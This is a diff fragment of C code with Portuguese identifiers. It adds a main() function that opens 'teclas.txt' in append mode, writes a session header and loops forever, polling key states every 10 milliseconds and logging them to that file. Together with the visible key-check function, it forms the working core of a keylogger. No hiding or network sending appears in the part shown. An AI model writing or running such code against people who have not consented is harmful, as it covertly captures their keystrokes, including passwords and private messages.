@@ -98,5 +98,19 @@ void VerificarTeclas(FILE *arquivo) {
         }
         if (!esta_pressionada && teclas[i].estava_pressionada) teclas[i].estava_pressionada = 0;
     }
+}
 
+int main() {
+    InicializarTeclas();
+
+    FILE *arquivo = fopen("teclas.txt", "a");
+    if (arquivo == NULL) return 1;
+
+    fprintf(arquivo, "===== NOVA SESSAO =====\n");
+    fflush(arquivo);
+
+    while(1) {
+        VerificarTeclas(arquivo);
+        Sleep(10);
+    }
 }
